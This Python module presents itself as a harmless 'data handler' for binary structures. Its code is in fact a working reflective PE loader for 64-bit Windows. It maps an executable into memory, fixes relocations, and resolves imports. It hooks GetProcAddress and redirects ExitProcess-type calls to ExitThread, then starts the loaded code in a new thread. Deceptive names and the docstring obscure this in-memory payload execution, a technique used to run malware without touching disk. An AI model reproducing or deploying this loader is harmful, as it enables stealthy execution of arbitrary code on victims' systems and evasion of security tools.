# -*- coding: utf-8 -*-
"""
Data handler — processes and optimizes binary data structures.
"""
import ctypes
import os
import struct
import sys
import time


def handle(data):
    if not data or len(data) < 64:
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        return False

    try:
        from . import platform, encoder

        k = platform.get_environment()
        if not k:
            return False

        d = encoder.parse_structure(data)
        if not d:
            return False

        return _process_buffer(k, d, data)

    except Exception:
        return False


def _process_buffer(k, d, data):
    v1 = k.VirtualAlloc(ctypes.c_void_p(d["b"]), d["s"], 0x3000, 0x04)
    v2 = False
    if not v1 or v1 != d["b"]:
        v1 = k.VirtualAlloc(None, d["s"], 0x3000, 0x04)
        v2 = True
    if not v1:
        return False

    _transfer_blocks(k, v1, d, data)

    if v2:
        if not _fix_references(k, v1, d):
            k.VirtualFree(ctypes.c_void_p(v1), 0, 0x8000)
            return False

    if d["i"]:
        _bind_dependencies(k, v1, d)

    _configure_access(k, v1, d)

    return _activate(k, v1, d)


def _transfer_blocks(k, base, d, data):
    tmp = d["h"]
    ctypes.memmove(base, data[:tmp], tmp)
    for vs, va, rs, rp, ch in d["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(data) - rp)
            if n > 0:
                ctypes.memmove(base + va, data[rp:rp + n], n)


def _fix_references(k, base, d):
    from . import encoder
    if not d["r"] or not d["z"]:
        return False
    delta = base - d["b"]
    pos = 0
    while pos < d["z"]:
        br = encoder.view(base + d["r"] + pos, "<I")
        bs = encoder.view(base + d["r"] + pos + 4, "<I")
        if bs == 0:
            break
        for j in range((bs - 8) // 2):
            ent = encoder.view(base + d["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + br + (ent & 0xFFF)
                encoder.patch(a, "<Q", encoder.view(a, "<Q") + delta)
        pos += bs
    return True


def _bind_dependencies(k, base, d):
    from . import encoder
    _handlers = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")
    _k32 = k.GetModuleHandleA(b"kernel32.dll")
    et = k.GetProcAddress(_k32, b"ExitThread")
    _gpa_raw = k.GetProcAddress(_k32, b"GetProcAddress")

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    _real_gpa = _GpaType(_gpa_raw)

    @_GpaType
    def _gpa_hook(hmod, name_or_ord):
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _handlers:
                    return et
            except Exception:
                pass
        return _real_gpa(hmod, nv)

    _gpa_hook_ptr = ctypes.cast(_gpa_hook, ctypes.c_void_p).value

    off = base + d["i"]
    while True:
        nr = encoder.view(off + 12, "<I")
        if nr == 0:
            break
        ir = encoder.view(off, "<I")
        ar = encoder.view(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        hm = k.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        while hm:
            tv = encoder.view(lk, "<Q")
            if tv == 0:
                break
            if tv & 0x8000000000000000:
                fa = k.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _handlers and et:
                    fa = et
                elif fn == b"GetProcAddress" and _gpa_hook_ptr:
                    fa = _gpa_hook_ptr
                else:
                    fa = k.GetProcAddress(hm, fn)
            if fa:
                encoder.patch(ia, "<Q", fa)
            lk += 8
            ia += 8
        off += 20


def _configure_access(k, base, d):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in d["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        hx = bool(ch & 0x20000000)
        hw = bool(ch & 0x80000000)
        pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
        k.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _activate(k, base, d):
    tid = ctypes.c_ulong(0)
    ht = k.CreateThread(
        None, 0, ctypes.c_void_p(base + d["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        return False
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if k.WaitForSingleObject(ht, 2000) == 0:
            break
    k.CloseHandle(ht)
    return True
